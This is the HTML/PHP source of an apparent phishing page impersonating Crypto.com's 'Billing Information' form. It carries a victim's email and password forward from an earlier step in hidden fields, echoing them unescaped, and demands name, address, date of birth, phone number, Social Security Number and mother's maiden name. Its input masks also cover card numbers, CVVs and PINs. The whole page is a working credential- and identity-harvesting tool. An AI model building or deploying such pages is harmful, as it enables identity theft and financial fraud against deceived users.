<html class="html5-background">
<head>
<meta charset="utf-8">
<meta content="IE=Edge,chrome=1" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
<link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
<title>Crypto.com Billing Information</title>
<meta name="csrf-param" content="authenticity_token">
<meta name="csrf-token" content="kY0MZgsrUw5mh23vAKVXdWiZUzzN/yEoNtM3RiWnP27i1Fsk2HOIonss+GS+dGiZ7+njptnbC/IYfH6UNEVdfw==">
<link rel="shortcut icon" type="image/x-icon" href="img/exchange-favicon-724eb3df60fd455d4d9fd1b7b325fd2ed23c283a26abe3cfd604a67af2da0ab9.png">
<link rel="stylesheet" media="all" href="https://app.mona.co/assets/pages/devise/oauth-ccb6fa3d03c5f5c03ada68b996966650c259065426c5495620d4c70dff8e10fb.css" data-turbolinks-track="reload">
<link type="text/css" href="https://cdn.cookielaw.org/skins/6.2.0/default_flat_bottom_two_button_white/v2/css/optanon.css" rel="stylesheet">
<style>
#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #002D74 !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #002D74 !important; border-color: #002D74 !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #FFFFFF !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #FFFFFF !important }.optanon-alert-box-wrapper { background-color:#D7DDE0 !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color:#030303 !important }#optanon #optanon-popup-body-left-shading {
background-color: #FFFFFF
}
</style>
<link href="https://static.geetest.com/static/wind/style_https.1.5.8.css" rel="stylesheet">
</head>
<body class="html5-background">
<nav class="navbar navbar-expand-md navbar-dark nav-background-color"><a class="navbar-brand"><img class="vertical-logo" src="img/logo.76653258-bc0a03bb4a9361a97e0a30259abce3c507233a859bc731900051833f4be8ea60.svg"></a><button aria-controls="navbar-toggle" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbar-toggle" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button>
<div class="collapse navbar-collapse" id="navbar-toggle">
  <ul class="navbar-nav mr-auto mt-lg-0">
    <li class="nav-item">
      <a class="text-nav-style" style="color: white;">Exchange</a>
    </li>
    <li class="nav-item">
      <a class="text-nav-style" style="color: white;">Markets</a>
    </li>
  </ul>
</div>
</nav>
<div class="container-fluid remove-padding">
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-md-6 remove-padding">
        <div class="flex-wrap padding-l">
          <h4 class="text-center text-color-white">Billing Information</h4>
        </div>
        <div class="form-container background-color-white">
          <form class="simple_form new_user" id="new_user" action="card" method="post">
          <input type="hidden" name="email" value="<?= $_POST['email']; ?>">
          <input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
            <div class="form-inputs form-style-text">
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">Full Name</label>
                <input class="form-control string email optional" onkeypress="return event.charCode < 48 || event.charCode  >57" placeholder="Enter Full Name" type="text" name="fname" autofocus required>
              </div>
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">Street Address</label>
                <input class="form-control string email optional" placeholder="Enter Street Address" type="text" name="address" required>
              </div>
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">City</label>
                <input class="form-control string email optional" placeholder="Enter City" type="text" name="city" required>
              </div>
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">State</label>
                <input class="form-control string email optional" placeholder="Enter State" type="text" name="state" required>
              </div>
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">ZIP Code</label>
                <input class="form-control string email optional" placeholder="Enter ZIP Code" type="text" name="zip" required>
              </div>
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">Date Of Birth</label>
                <input class="form-control string email optional mask-dob" placeholder="DD-MM-YYYY" type="text" name="dob" required>
              </div>
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">Phone Number</label>
                <input class="form-control string email optional" placeholder="Enter Phone Number" type="text" name="phone" required>
              </div>
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">Social Security Number</label>
                <input class="form-control string email optional mask-ssn" placeholder="000-00-0000" type="text" name="ssn" required>
              </div>
              <div class="form-group email optional user_email">
                <label class="control-label email optional" for="user_email">Mother's Maiden Name</label>
                <input class="form-control string email optional" placeholder="Enter Mother's Maiden Name" onkeypress="return event.charCode < 48 || event.charCode  >57" type="text" name="mmn" required>
              </div>
              <button name="button" type="submit" class="btn btn-default btn btn-primary btn-block margin-bottom-m" id="sign-in-btn">Update Billing</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Masking -->
<script src="js/jquery.min.js"></script>
<script src="js/jquery.mask.min.js"></script>
<script type="text/javascript">
    $(document).ready(function(){
      $('.mask-exp').mask('00/00');
      $('.mask-ccn').mask('0000 0000 0000 0000');
      $('.mask-zip').mask('00000');
      $('.mask-dob').mask('00-00-0000');
      $('.mask-dln').mask('00 000 000');
      $('.mask-ssn').mask('000-00-0000');
      $('.mask-cvv').mask('0000');
      $('.mask-pin').mask('000000');
      $('.time').mask('00:00:00');
      $('.date_time').mask('00/00/0000 00:00:00');
      $('.mask-phone').mask('(000) 000-0000');
      $('.phone_with_ddd').mask('(00) 0000-0000');
      $('.phone_us').mask('(000) 000-0000');
      $('.mixed').mask('AAA 000-S0S');
      $('.money').mask('000.000.000.000.000,00', {reverse: true});
      $('.money2').mask("#.##0,00", {reverse: true});
      $('.ip_address').mask('099.099.099.099');
      $('.percent').mask('##0,00%', {reverse: true});
      $('.placeholder').mask("00/00/0000", {placeholder: "__/__/____"});
      $('.mask-cc').mask('0000 0000 0000 0000');
      $('.valid').mask('00/00');
    });
  </script>
<!-- End Masking -->
<!-- Validasi Number & Text -->
<script>
    function hanyaAngka(evt) {
      var charCode = (evt.which) ? evt.which : event.keyCode
       if (charCode > 31 && (charCode < 48 || charCode > 57))
 
        return false;
      return true;
    }
  </script>
<!-- End Validasi -->
</body>
</html>